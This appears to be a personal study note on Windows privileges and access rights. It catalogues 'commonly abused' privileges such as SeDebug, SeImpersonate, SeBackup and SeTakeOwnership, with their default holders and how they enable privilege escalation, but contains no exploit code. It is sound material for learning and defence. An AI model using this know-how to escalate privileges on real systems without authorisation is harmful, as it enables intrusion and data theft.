Windows Privileges:

  • Definition

    • Special rights assigned to user accounts or groups.
    • Allow users to perform specific actions that affect the entire system or other users.

  • Examples

    • Change the system time
      • Allows user to modify the system clock.
    • Shut down the system
      • Grants the ability to power off or restart the computer.
    • Load and unload device drivers
      • Permits the installation and removal of system drivers.

  • Administration

    • Managed through Group Policy and user account settings.
    • Can be tailored for specific roles and responsibilities.

  • Security Implications

    • High privileges can pose security risks if misused or exploited.
    • Principle of Least Privilege recommends minimizing user privileges to reduce attack vectors.

Disabled Privileges:

  • When a privilege is listed in the Disabled state it maeans that our account has it asssigned but we cannot actually perform it until it is enabled.
  • Windows does not have a cmdlet to enable privs.

Difference Between access rights, user rights, privileges:

Privileges vs. Access Rights:

  • Privileges:

    • Allow performing system-related operations (e.g., shutting down the system, loading device drivers).
    • Assigned to user and group accounts by a system administrator.
    • Govern access to system resources and tasks.

  • Access Rights:

    • Control access to securable objects.
    • Granted or denied by the system based on ACEs in the object’s DACL.

  • Privilege Management

    • Accounts and Privileges:
      • Each system has an account database storing privileges for user and group accounts.
      • Upon user login, an access token is created, listing the user’s privileges.
      • Privileges apply only to the local computer; domain accounts can have different privileges on different systems.
    • Privilege Verification and Enforcement:
      • When a privileged operation is attempted, the system checks the user’s access token for the necessary privileges and whether they are enabled.
      • Operations are not performed if the required privileges are not held or are disabled.
    • Privilege Identification:
      • Windows API uses string constants (e.g., SE_ASSIGNPRIMARYTOKEN_NAME) for privilege identification, defined in Winnt.h.
      • Privileges are identified in access tokens using the LUID type, which can vary across computers and boots.
      • Functions like LookupPrivilegeValue and LookupPrivilegeName map between string constants and LUIDs.
    • Display Names for Privileges:
      • The system provides display names for each privilege, retrievable using LookupPrivilegeDisplayName (e.g., “Change the system time” for SE_SYSTEMTIME_NAME).

  • Programming and Administrative Tools

    • Checking Privileges:
      • The GetTokenInformation function determines the privileges in an access token and which are enabled.
      • The PrivilegeCheck function checks if an access token holds a specific set of privileges, useful for server applications impersonating a client.
    • Administrative Tools:
      • Tools like User Manager allow administrators to add or remove privileges for accounts.
    • Local Security Authority (LSA) Functions:
      • LsaAddAccountRights and LsaRemoveAccountRights to add or remove privileges from an account.
      • LsaEnumerateAccountRights to list privileges held by an account.
      • LsaEnumerateAccountsWithUserRight to list accounts holding a specified privilege.

Commonly Abused Privileges:

System and Service Operations Privileges:

SeTcbPrivilege:

  • Allows a process to perform tasks usually reserved for the operating system, providing high-level control over system functions.

SeDebugPrivilege:

  • https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs

  • Can be used to dump

  • SeDebugPrivilege Overview

    • Enables a user to attach a debugger to any process, facilitating troubleshooting and system analysis.

  • Purpose:

    • Allows a user to run specific applications or services, and assist with troubleshooting without being added to the administrators group.

  • Assignment Method:

    • Via local or domain group policy: Computer Settings > Windows Settings > Security Settings.

  • Default Assignment:

    • By default, this privilege is granted only to administrators.

  • Usage Context:

    • Often assigned to developers for debugging new system components.

  • Security Considerations:

    • Can be used to capture sensitive information from system memory or access/modify kernel and application structures.
    • Should be granted sparingly due to potential access to critical operating system components.

SeLoadDriverPrivilege:

  • Permits the dynamic loading and unloading of device drivers, which can be essential for system updates or configuration changes.
    • Being part of the Print Operators Group: provides this privilege by default.

SeAssignPrimaryTokenPrivilege:

  • Allows a process to assign a primary token to a process, effectively altering the security context under which the process runs.

SeEnableDelegationPrivilege:

  • Grants the ability to mark user and computer accounts as delegatable, enabling advanced Kerberos authentication scenarios.

SeImpersonatePrivilege:

  • take advantage of these privileges.

  • A security privilege in Windows that allows a process to adopt the security context of another user, typically after that user has been authenticated.

  • Essential for scenarios where a service (like SQL Server or IIS) needs to perform operations on behalf of an authenticated user, particularly when accessing resources that require user-specific permissions.

  • Impersonation with SeImpersonatePrivilege:

    • Overview:
      • Every process has an associated token that represents the identity and privileges of the account that initiated the process.
      • The token contains security information like user identity, group memberships, and associated privileges.
      • This token is automatically assigned when the process starts, based on the account under which the process is running (e.g., a system account or a user account).

  • Impersonation Using SeImpersonatePrivilege:

    • When a service impersonates a user, it temporarily uses the user’s token to perform actions with the user’s permissions.
      • The service can access resources (like file shares) that the user is allowed to access.
      • The privilege allows the process running the service to “borrow” the identity of another user securely.

  • Summarized: The token of each process defines what that process can do, based on the permissions of the account running it. SeImpersonatePrivilege allows services to use another user’s token for performing tasks on their behalf.

  • Usage Context:

    • In the context of SQL Server or IIS using Windows Authentication, SeImpersonatePrivilege enables these services to perform tasks under the security context of the connected user, ensuring that operations adhere to the principle of least privilege and respect user-specific access controls.

  • Example of Impersonate Privilege Working:

    • How Impersonation Works:

      • The client connects to the service using their credentials (via Windows Authentication).
      • The service, upon needing to access other resources (like file shares), uses the client’s identity instead of its own.
      • This is possible because the service account is given a special privilege called “Impersonate a client after authentication”.

    • Simple Text-Based Diagram of Impersonation Mechanism Working:

      [Client]
    |
    | (1) Authenticates using Windows Auth
    v
[Server (SQL/IIS)]
    |
    | (2) Needs to access other resources
    v
[Impersonation Process]
    |
    | (3) Server adopts the client's identity
    v
[Other Resources]
  (e.g., File Shares)
      1. Client to Server Authentication: The client authenticates to the server using Windows authentication.
      2. Resource Request: The server requires access to additional resources (like files).
      3. Impersonation: The server impersonates the client’s identity to gain the same permissions the client has.
      4. Access Resources: The server, acting as the client, accesses external resources (file shares, etc.).

Security and Auditing Privileges:

SeSecurityPrivilege:

  • Grants the ability to manage and configure security policies, view and clear security logs, which is vital for maintaining system security.

SeAuditPrivilege:

  • Allows the generation of audit logs for tracking user activities and system changes, aiding in compliance and security monitoring.

File and Directory Operations:

SeBackupPrivilege:

  • This will let us copy a file from a folder, even if there is no access control entry () for us in the folder’s access control list (ACL).

    • !!! However, we can’t do this using the standard copy command. !!!
    • Instead, we need to programmatically copy the data, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag.

  • Member of the Backup Operators Group & Server Operators: get this privilege by default:

    • Check attacks here too.

  • Provides read access to all files and directories for backup purposes, bypassing standard permissions.

  • Purpose

    • Allows a process to read any file, regardless of the file’s permissions.
    • Used primarily for backup applications that need access to all files.

  • Key Characteristics

    • Bypasses standard file read permissions.
    • Does not enable writing or deleting files, only reading.
    • Typically assigned to backup software or administrative tasks.

  • Security Considerations

    • High potential for abuse if granted to unauthorized applications or users.
    • Should be closely monitored and restricted to trusted applications and personnel.

  • Default Assignment

    • Typically assigned to backup software or services during installation or configuration.

  • Use in Penetration Testing

    • Identifying misuse or over-assignment can indicate potential vulnerabilities.
    • Exploiting improperly secured SeBackupPrivilege could allow reading sensitive files.

SeRestorePrivilege:

  • Member of the Backup Operators Group & Server Operators: get this privilege by default:

  • Allows write access to all files and directories for restoration purposes, overriding standard access controls.

  • Purpose

    • Enables a process to write to any file, regardless of the file’s permissions.
    • Primarily used by restoration applications to recover files and directories.

  • Key Characteristics

    • Bypasses standard file write permissions.
    • Allows setting any file attributes, including those that govern file access permissions.
    • Does not permit reading or deleting files, only writing and attribute manipulation.

  • Security Considerations

    • Significant potential for misuse if allocated to unauthorized applications or users.
    • Access should be closely controlled and limited to trusted applications and personnel.

  • Default Assignment

    • Not provided to users by default.
    • Usually granted to restoration software or services during their installation or setup.

  • Use in Penetration Testing

    • Discovering improper allocation or misuse can reveal security weaknesses.
    • Exploitation of inadequately secured SeRestorePrivilege could allow unauthorized file modifications or system configurations.

SeTakeOwnershipPrivilege:

  • SeTakeOwnershipPrivilege Overview:

    • Grants a user the ability to take ownership of various “"(Files, securable objects are just files):

      • NTFS files/folders
      • Printers
      • Services
      • Processes
    • Provides rights, enabling the user to change the owner in the object’s .
      • Typically assigned to Administrators by default.

  • Issueing the privilege:

    • Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment

  • Usage Contexts:

    • Rare for standard user accounts to have this privilege.
    • More commonly seen with service accounts, e.g., those running backup jobs and VSS snapshots.

  • Related Privileges:

    • Service accounts with SeTakeOwnershipPrivilege might also have:
      • SeBackupPrivilege
      • SeRestorePrivilege
      • SeSecurityPrivilege
    • These are to control the account’s privileges more granularly without full local admin rights.

  • Privilege Escalation Potential:

    • While these privileges can potentially be used for privilege escalation, there are situations where taking ownership of specific files is necessary, especially when other methods are blocked or ineffective.

Token and Access Rights Privileges:

SeCreateTokenPrivilege:

  • Allows a process to create access tokens, which can be used to define security contexts for user impersonation and process execution.

System Configuration and Environment Privileges:

SeSystemEnvironmentPrivilege:

  • Grants the ability to modify system environment settings, including BIOS and firmware configurations, which can affect hardware operation and system startup.

SeMachineAccountPrivilege:

  • See
  • Purpose: Grants the right to a user or group to create and join computer accounts to the domain.
  • Associated Privilege: Held by users/groups like Domain Admins or delegated users who need to add computers to the domain.
  • Location: This is a specific user right assignment in the Local Security Policy.
  • Default Holders:
    • Domain Administrators.
    • Members of groups delegated for computer account management.
  • Security Implications:
    • Attackers who gain this privilege can create new computer accounts or rejoin existing ones, which can lead to domain persistence or other attacks.
    • Should be tightly controlled and audited to prevent abuse.

Restricted Access Tokens:

  • These are modified tokens with controlled privileges, created under conditions like to limit privileges based on user group membership or specific privileges granted.
